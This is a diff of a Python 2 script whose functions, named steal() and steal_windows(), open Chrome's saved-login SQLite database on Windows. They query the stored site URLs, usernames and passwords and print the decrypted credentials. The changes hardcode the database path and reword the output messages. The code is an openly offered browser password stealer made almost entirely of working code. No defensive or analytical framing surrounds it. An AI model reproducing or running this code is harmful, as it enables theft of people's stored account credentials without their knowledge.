@@ -13,9 +13,7 @@ def steal():
 
 def steal_windows():
 	# Chrome keeps passwords in the %LOCALAPPDATA%\Chrome\User Data\Default\Login Data
-	for walk in os.walk(os.getenv('LOCALAPPDATA')):
-		if 'Chrome' in walk[1]:
-			path = str(walk[0]) + '\Chrome\User Data\Default\Login Data'
+	path = os.getenv('LOCALAPPDATA')  + '\\Chrome\\User Data\\Default\\Login Data'
 	try:
 		# Try to open the SQLite3 database
 		conn = sqlite3.connect(path)
@@ -28,7 +26,7 @@ def steal_windows():
 	try:
 		cursor.execute('SELECT action_url, username_value, password_value FROM logins WHERE username_value IS NOT \'\' OR password_value IS NOT \'\'')
 	except:
-		print '[-] Error executing the query'
+		print '[-] Error getting the passwords'
 		return
 	# Fetch all data
 	data = cursor.fetchall()
@@ -44,12 +42,12 @@ def steal_windows():
 				pass
 			# If the password is found
 			if password:
-				# If the URL is blank,it doesn't have to be
+				# If the URL is blank,print it as (Unknown)
 				if(len(result[0]) <= 0):
 					result[0] = "(Unknown)"
 				# Print the result
-				print "URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password)
+				print "[+] URL:{url}\nUsername:{user}\nPassword:{pass_}\n".format(url=result[0],user=result[1],pass_=password)
 		return
 	else:
-		print '[-] No results returned from query'
+		print '[-] There are no passwords'
 		return
